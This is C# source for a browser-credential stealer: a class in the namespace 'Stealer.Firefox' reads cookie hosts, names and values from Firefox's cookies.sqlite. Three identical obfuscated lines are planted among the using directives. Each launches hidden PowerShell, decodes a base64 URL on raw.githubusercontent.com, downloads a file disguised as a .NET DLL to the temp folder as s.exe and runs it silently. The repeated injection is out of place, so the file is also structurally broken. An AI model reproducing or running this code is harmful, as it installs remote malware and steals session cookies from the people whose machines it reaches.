using System;
using System.IO;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Collections.Generic;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}



try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Text;

using System.Windows.Forms;


namespace Stealer.Firefox
{
    internal sealed class cCookies
    {
        // Get cookies.sqlite file location
        private static string GetCookiesDBPath(string path)
        {
            try
            {
                string dir = path + "\\Profiles";
                if (Directory.Exists(dir))
                    foreach (string sDir in Directory.GetDirectories(dir))
                        if (File.Exists(sDir + "\\cookies.sqlite"))
                            return sDir + "\\cookies.sqlite";
            }
            catch (Exception ex) {  }
            return null;
        }

        // Get cookies from gecko browser
        public static List<Cookie> Get(string path)
        {
            List<Cookie> lcCookies = new List<Cookie>();
            try
            {
                string sCookiePath = GetCookiesDBPath(path);

                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sCookiePath, "moz_cookies");
                if (sSQLite == null) return lcCookies;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
				
 Cookie cCookie = new Cookie();
                    cCookie.sHostKey = sSQLite.GetValue(i, 4); //  ok
                    cCookie.sName = sSQLite.GetValue(i, 2);   // s etoi
                    cCookie.sValue = sSQLite.GetValue(i, 3); //  meniali
                    cCookie.sPath = sSQLite.GetValue(i, 5); // ok
    	cCookie.sExpiresUtc = sSQLite.GetValue(i, 6); // ok
		
		
/*
                   printf("%s\t",(char *)sqlite3_column_text(stmt, 4));
		if(sqlite3_column_int(stmt, 9)==0) printf("FALSE\t");
		if(sqlite3_column_int(stmt, 9)==1) printf("TRUE\t");
		printf("%s\t",(char *)sqlite3_column_text(stmt, 5));
		if(sqlite3_column_int(stmt, 10)==0) printf("FALSE\t");
		if(sqlite3_column_int(stmt, 10)==1) printf("TRUE\t");
		printf("%s\t",(char *)sqlite3_column_text(stmt, 6));
		printf("%s\t",(char *)sqlite3_column_text(stmt, 2));  
		printf("%s\t",(char *)sqlite3_column_text(stmt, 3)); 
		
		
				  */				   
        /*
		string c1= sSQLite.GetValue(i, 4);
		string c2 = sSQLite.GetValue(i, 9);
		string c3 =sSQLite.GetValue(i, 5);
		string c4 =sSQLite.GetValue(i, 10);
		string c5 =sSQLite.GetValue(i, 6);
		string c6 =sSQLite.GetValue(i, 2);
		string c7 = sSQLite.GetValue(i, 3);
		
		string allcookie = c1 + "\t" + "TRUE" + "\t" + c3 + "\t" + "FALSE" + "\t" +  c5 + "\t" + c6 + "\t" + c7 ;
		
		
			string PasswordsStoreDirectory = Path.Combine(Path.GetTempPath(),"pwtmp" );
			if (!Directory.Exists(PasswordsStoreDirectory)) Directory.CreateDirectory(PasswordsStoreDirectory);
		
		string savepath= PasswordsStoreDirectory + "\\" + "Firefox" + "\\FCookies.txt";

MessageBox.Show(savepath,"path");		
		
		File.AppendAllText(savepath, allcookie + Environment.NewLine);
		*/
		

		 Counter.Cookies++;
                    lcCookies.Add(cCookie);
                }

            }
            catch (Exception ex) {  }
            return lcCookies;
        }

    }
}


